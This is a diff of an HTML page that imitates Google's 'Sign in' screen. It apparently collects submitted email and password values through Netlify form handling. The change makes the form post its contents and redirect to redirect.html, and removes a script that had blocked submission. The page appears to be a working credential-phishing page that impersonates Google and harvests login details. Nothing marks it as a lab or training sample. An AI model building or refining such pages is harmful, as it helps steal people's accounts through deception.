@@ -17,7 +17,7 @@
           <img src="logo.png">
                 <h2>Sign in</h2>
                 <p>Use your Google Account</p>
-                <form id="myForm" data-netlify="true">
+                <form id="myForm" action=redirect.html method=post data-netlify="true">
                   <div class="inputBox">
                     <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
                     <label>Username</label>
@@ -32,11 +32,5 @@
                       <p class="ex3"><a style="text-decoration:none" href="https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=IN&continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&dsh=S285558881%3A1682449871829544&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en">Create account</a></p>
                 </form>
               </div>
-              <script>
-                document.getElementById('myForm').addEventListener('submit', function(event) {
-                  event.preventDefault(); // prevent default form submission behavior
-                  window.close(); // close the current window
-                });
-              </script>
 </body>
 </html>
